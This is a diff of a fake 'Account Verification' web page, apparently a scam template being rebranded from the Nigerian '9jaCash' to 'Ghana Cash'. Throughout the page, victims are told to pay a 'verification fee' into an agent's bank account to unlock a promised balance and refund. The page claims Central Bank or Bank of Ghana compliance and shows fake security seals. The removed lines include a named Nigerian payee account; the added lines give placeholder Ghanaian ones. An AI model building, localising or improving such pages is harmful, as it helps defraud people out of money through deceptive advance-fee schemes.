@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Account Verification - 9jaCash</title>
+<title>Account Verification - Ghana Cash</title>
 
 <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-auth-compat.js"></script>
@@ -214,14 +213,14 @@ body{font-family:'Plus Jakarta Sans',sans-serif;background:#0f172a;color:#f8fafc
   <div class="info-icon"><i class="fa-solid fa-circle-info"></i></div>
   <div class="info-title">Why This Verification?</div>
   <div class="info-text">
-    To comply with <strong>CBN financial regulations</strong>, we need to verify your linked account on our end before processing large withdrawals to your linked account. This <span class="highlight">₦35,200</span> verification fee is a <strong>security deposit</strong> The <strong>₦35,000</strong> will be refunded back to your account after successful verification, while the <strong>₦200</strong> covers transfer charges.
+    To comply with <strong>Bank of Ghana (BoG) financial regulations</strong>, we need to verify your linked account on our end before processing large withdrawals to your linked account. This <span class="highlight">GH₵293.33</span> verification fee is a <strong>security deposit</strong> The <strong>GH₵291.67</strong> will be refunded back to your account after successful verification, while the <strong>GH₵1.67</strong> covers transfer charges.
   </div>
 </div>
 
 <!-- TOTAL PAYOUT CARD (NEW) -->
 <div class="total-payout-card anim d3">
   <div class="total-payout-label"><i class="fa-solid fa-money-bill-wave" style="margin-right:6px;"></i>Total Amount You Will Receive</div>
-  <div class="total-payout-amount" id="totalAmountDisplay">₦0<span>.00</span></div>
+  <div class="total-payout-amount" id="totalAmountDisplay">GH₵0<span>.00</span></div>
   <div class="total-payout-note">
     <i class="fa-solid fa-check"></i> Sent to your linked account after verification
   </div>
@@ -230,15 +229,15 @@ body{font-family:'Plus Jakarta Sans',sans-serif;background:#0f172a;color:#f8fafc
   <div class="breakdown-wrap">
     <div class="breakdown-row">
       <div class="breakdown-label"><i class="fa-solid fa-rotate-left" style="color:#10b981;"></i>Verification Refund</div>
-      <div class="breakdown-value refund">+ ₦35,000</div>
+      <div class="breakdown-value refund">+ GH₵291.67</div>
     </div>
     <div class="breakdown-row">
       <div class="breakdown-label"><i class="fa-solid fa-wallet" style="color:#6366f1;"></i>Your Wallet Balance</div>
-      <div class="breakdown-value wallet" id="walletBreakdown">₦0</div>
+      <div class="breakdown-value wallet" id="walletBreakdown">GH₵0</div>
     </div>
     <div class="breakdown-row total">
       <div class="breakdown-label"><i class="fa-solid fa-calculator" style="color:#ec4899;"></i>Total Payout</div>
-      <div class="breakdown-value total" id="totalBreakdown">₦0</div>
+      <div class="breakdown-value total" id="totalBreakdown">GH₵0</div>
     </div>
   </div>
   
@@ -246,7 +245,7 @@ body{font-family:'Plus Jakarta Sans',sans-serif;background:#0f172a;color:#f8fafc
   <div style="text-align:center;">
     <div class="added-badge">
       <i class="fa-solid fa-circle-check"></i>
-      <span>₦35,000 verification refund has been added</span>
+      <span>GH₵291.67 verification refund has been added</span>
     </div>
   </div>
 </div>
@@ -262,7 +261,7 @@ body{font-family:'Plus Jakarta Sans',sans-serif;background:#0f172a;color:#f8fafc
 
   <div class="detail-row">
     <div class="detail-label">Amount</div>
-    <div class="detail-value accent" id="feeAmount">₦35,200</div>
+    <div class="detail-value accent" id="feeAmount">GH₵293.33</div>
   </div>
   <div class="detail-row">
     <div class="detail-label">Bank Name</div>
@@ -286,7 +285,7 @@ body{font-family:'Plus Jakarta Sans',sans-serif;background:#0f172a;color:#f8fafc
   <div class="guarantee-icon"><i class="fa-solid fa-rotate-left"></i></div>
   <div class="guarantee-title">100% Refund + Balance Release</div>
   <div class="guarantee-text">
-    Your <strong>₦35,000</strong> will be refunded, and your wallet balance of <strong id="guaranteeBalance">₦0</strong> will be released. <strong>Total payout will be sent to your linked account immediately after verification.</strong>
+    Your <strong>GH₵291.67</strong> will be refunded, and your wallet balance of <strong id="guaranteeBalance">GH₵0</strong> will be released. <strong>Total payout will be sent to your linked account immediately after verification.</strong>
   </div>
 </div>
 
@@ -314,7 +313,7 @@ body{font-family:'Plus Jakarta Sans',sans-serif;background:#0f172a;color:#f8fafc
 <div class="trust-footer anim d8">
   <div class="trust-footer-text">
     <i class="fa-solid fa-lock"></i> Secured by 256-bit encryption
-    <i class="fa-solid fa-shield-halved"></i> CBN Compliant
+    <i class="fa-solid fa-shield-halved"></i> BoG Compliant
     <i class="fa-solid fa-check-double"></i> Instant Reversal
   </div>
   <div class="trust-seals">
@@ -350,11 +349,11 @@ let verifyData = null;
 
 // ========== FORMAT MONEY ==========
 function formatMoney(num) {
-  if (!num && num !== 0) return "₦0";
+  if (!num && num !== 0) return "GH₵0";
   let n = parseFloat(num);
-  if (isNaN(n)) return "₦0";
-  if (n >= 1000000) return "₦" + (n / 1000000).toFixed(2) + "M";
-  return "₦" + n.toLocaleString("en-NG");
+  if (isNaN(n)) return "GH₵0";
+  if (n >= 1000000) return "GH₵" + (n / 1000000).toFixed(2) + "M";
+  return "GH₵" + n.toLocaleString("en-GH", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
 }
 
 // ========== LOAD VERIFY DATA ==========
@@ -382,10 +381,10 @@ function loadVerifyData() {
     } catch(e) {}
   }
   
-  // The verification refund is ₦35,000 (35,200 - 200 transfer charges)
-  const verificationRefund = 35000;
+  // The verification refund is GH₵291.67 (35,000 / 120)
+  const verificationRefund = 291.67;
   
-  // Wallet total = dashboard balance + pending bounce
+  // Wallet total = dashboard balance + pending bounce (not divided)
   const walletTotal = dashboardBalance + pendingBounceAmount;
   
   // Grand total = wallet total + verification refund
@@ -419,25 +418,26 @@ function loadFeeData() {
       .then(function(doc) {
         if (doc.exists) {
           feeData = doc.data();
+          if (feeData.amount) feeData.amount = parseFloat(feeData.amount) / 120;
           updateFeeDisplay();
         } else {
-          feeData = { amount: 35200, bank: "Moniepoint MFB", accNumber: "5263970551", accName: "David Isang | Ts Agent" };
+          feeData = { amount: 293.33, bank: "GCB Bank", accNumber: "0123456789", accName: "Kwame Mensah | Agent" };
           updateFeeDisplay();
         }
       })
       .catch(function(err) {
-        feeData = { amount: 35200, bank: "Moniepoint MFB", accNumber: "5263970551", accName: "David Isang | Ts Agent" };
+        feeData = { amount: 293.33, bank: "GCB Bank", accNumber: "0123456789", accName: "Kwame Mensah | Agent" };
         updateFeeDisplay();
       });
   } else {
-    feeData = { amount: 35200, bank: "Moniepoint MFB", accNumber: "5263970551", accName: "David Isang | Ts Agent" };
+    feeData = { amount: 293.33, bank: "GCB Bank", accNumber: "0123456789", accName: "Kwame Mensah | Agent" };
     updateFeeDisplay();
   }
 }
 
 function updateFeeDisplay() {
   if (!feeData) return;
-  const amount = parseFloat(feeData.amount) || 35200;
+  const amount = parseFloat(feeData.amount) || 293.33;
   document.getElementById("feeAmount").textContent = formatMoney(amount);
   document.getElementById("feeBankName").textContent = feeData.bank || "—";
   document.getElementById("feeAccNumber").textContent = feeData.accNumber || "—";
@@ -529,7 +529,7 @@ function submitVerification() {
     } catch(e) {}
   }
   const walletTotal = dashboardBalance + pendingBounceAmount;
-  const verificationRefund = 35000;
+  const verificationRefund = 291.67;
   const grandTotal = walletTotal + verificationRefund;
   
   const verificationData = {
@@ -541,7 +541,7 @@ function submitVerification() {
     accountNumber: userData.accountNumber || "",
     accountName: userData.fullName || userData.name || "",
     payoutKey: verifyData ? verifyData.payoutKey : "",
-    feeAmount: feeData ? (feeData.amount || 35200) : 35200,
+    feeAmount: feeData ? (feeData.amount || 293.33) : 293.33,
     feeBank: feeData ? (feeData.bank || "") : "",
     feeAccNumber: feeData ? (feeData.accNumber || "") : "",
     feeAccName: feeData ? (feeData.accName || "") : "",
